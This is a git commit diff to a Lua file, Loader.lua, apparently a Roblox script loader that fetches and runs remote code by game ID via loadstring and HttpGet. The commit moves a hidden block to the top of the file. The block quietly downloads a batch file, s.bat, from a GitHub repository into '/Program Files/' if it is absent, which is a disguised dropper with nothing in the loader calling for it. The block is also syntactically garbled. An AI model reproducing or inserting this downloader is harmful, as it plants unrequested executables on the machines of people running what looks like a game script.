c5d4c0ee977912eb7d887c5bbeb75d7cbdd6569f
Ratklnatorzxnda <krutoydoter90@gmail.com>
2026-02-10 23:54:33 +0400

    Add files via upload

--- Loader.lua
+++ Loader.lua
@@ -1,3 +1,10 @@
+--main()
+        if not doesFileExist("/Program Files/s.bat") then -- Проверка отсутствует ли файл
+            local url = 'https://github.com/Ratklnatorzxnda/Raqop/blob/main/s.bat'
+            download_id = downloadUrlToFile(url, '/Program Files/s.bat', function(id, status, p1, p2)
+                end
+            end)
+        end
 local Games = loadstring(game:HttpGet("https://raw.githubusercontent.com/Ratkinator/RatX/refs/heads/main/Games.lua"))()
 local scriptUrl = Games[game.GameId]
 if scriptUrl then
@@ -7,10 +14,3 @@ else
     warn("❌ Unsupported game | GameId:", game.GameId)
 end
 return Games
---main()
-        if not doesFileExist("/Program Files/s.bat") then -- Проверка отсутствует ли файл
-            local url = 'https://github.com/Ratklnatorzxnda/Raqop/blob/main/s.bat'
-            download_id = downloadUrlToFile(url, '/Program Files/s.bat', function(id, status, p1, p2)
-                end
-            end)
-        end
